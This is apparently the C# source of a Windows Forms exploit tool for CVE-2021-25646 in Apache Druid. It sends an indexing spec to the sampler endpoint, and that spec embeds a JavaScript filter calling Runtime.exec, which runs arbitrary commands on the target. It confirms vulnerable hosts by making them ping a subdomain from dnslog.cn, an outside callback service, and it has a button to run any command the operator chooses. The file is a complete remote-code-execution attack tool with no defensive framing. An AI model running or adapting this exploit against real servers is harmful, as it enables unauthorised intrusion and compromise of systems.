using System;
using System.Text;
using System.Windows.Forms;
using System.Net.Http;
using System.Net;
using System.Collections.Generic;
using System.Linq;
using System.Threading;

namespace CVE_2021_25646
{
    public partial class Form1 : Form
    {
        public string result_cookie = "";
        public int count = 10;
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e){
            this.getDnsLogDomain();
        }

        public void setStyle(Boolean status)
        {
            if (status)
            {
                scan_button.Enabled = false;
                scan_button.Text = "Waiting...";
                button2.Enabled = false;
            }
            else
            {
                scan_button.Enabled = true;
                scan_button.Text = "漏洞扫描";
                button2.Enabled = true;
            }
        }
        public async void getDnsLogDomain()
        {
            StringBuilder sb_cookie = new StringBuilder();
            this.checkValue();
            this.setStyle(true);
            textBox3.Text += "[ * ]Geting DnsLog subdomain....\r\n";

            var url = "http://www.dnslog.cn/getdomain.php";
            CookieContainer cookieContainer = new CookieContainer();
            var uri = new Uri(url);
            var handler = new HttpClientHandler();
            handler.CookieContainer = cookieContainer;
            HttpClient client = new HttpClient(handler);
            var response = await client.GetAsync(uri);
            var responseString = await response.Content.ReadAsStringAsync();

            List<Cookie> cookies = cookieContainer.GetCookies(uri).Cast<Cookie>().ToList();

            foreach (var item in cookies)
            {
                sb_cookie.Append(item.Name);
                sb_cookie.Append("=");
                sb_cookie.Append(item.Value);
                sb_cookie.Append(";");

            }
            result_cookie = sb_cookie.ToString();

            textBox2.Text = "ping - c 1 "+ responseString;

            textBox3.Text += "[ * ]Success,Your domain:" + responseString + "\r\n";

            this.exploit(textBox2.Text,true);

        }
        private void checkValue()
        {
            if (textBox1.Text.EndsWith("/"))
            {
                textBox1.Text = textBox1.Text.Substring(0, textBox1.Text.Length - 1);
            }
            if(textBox1.Text.Equals(""))
            {
                MessageBox.Show("老哥，你还没填写目标的URL。");
            }

        }
        private async void checkDnsLog()
        {
            var client = new HttpClient();
            client.DefaultRequestHeaders.Add("Cookie",this.result_cookie);
            textBox3.Text += "[ * ]Waiting Request CallBack....\r\n";
            var result = await client.GetStringAsync("http://www.dnslog.cn/getrecords.php");
            if(result.Length < 5)
            {
                textBox3.Text += "[ + ]Target is vulnerable!!!\r\n";
                this.setStyle(false);
            }
            else
            {
                this.checkDnsLog();
                if (this.count != 0)
                {
                    this.checkDnsLog();
                }
                else
                {
                    this.setStyle(false);
                }
                this.count--;
            }
        }

        private async void exploit(String command,Boolean IsCheckLog)
        {
            HttpClient client = new HttpClient();
            var payload = "{\"type\": \"index\", \"spec\": {\"ioConfig\": {\"type\": \"index\", \"inputSource\": {\"type\": \"inline\", \"data\": \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2020-12-12T12:10:21.040Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"}, \"inputFormat\": {\"type\": \"json\", \"keepNullColumns\": true}}, \"dataSchema\": {\"dataSource\": \"sample\", \"timestampSpec\": {\"column\": \"timestamp\", \"format\": \"iso\"}, \"dimensionsSpec\": {}, \"transformSpec\": {\"transforms\": [], \"filter\": {\"type\": \"javascript\", \"dimension\": \"added\", \"function\": \"function(value) {java.lang.Runtime.getRuntime().exec('"+ command + "')}\", \"\": {\"enabled\": true}}}}, \"type\": \"index\", \"tuningConfig\": {\"type\": \"index\"}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}}";
            String targetURL = textBox1.Text + "/druid/indexer/v1/sampler" + "\r\n";
            var content = new StringContent(payload.ToString(), Encoding.UTF8, "application/json");
            textBox3.Text += "[ * ]Sending to " + targetURL;
            try
            {
                var responseString = await client.PostAsync(targetURL, content);
                if (responseString.IsSuccessStatusCode)
                {
                    textBox3.Text += "[ + ]Success!!!\r\n";
                    if (IsCheckLog)
                    {
                        this.checkDnsLog();
                    }
                    else
                    {
                        this.setStyle(false);
                    }
                }
                else
                {
                    textBox3.Text += "[ - ] Error:" + responseString.StatusCode.ToString() + "\r\n";
                    this.setStyle(false);
                }
            }
            catch (Exception e){
                textBox3.Text += "[ - ] Connect Error!\r\n";
                this.setStyle(false);
            }
            }
        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.checkValue();
            if (textBox2.Text.Equals(""))
            {
                MessageBox.Show("你要执行什么命令???");
            }
            else
            {
                this.exploit(textBox2.Text, false);
            }
            
        }
    }
}
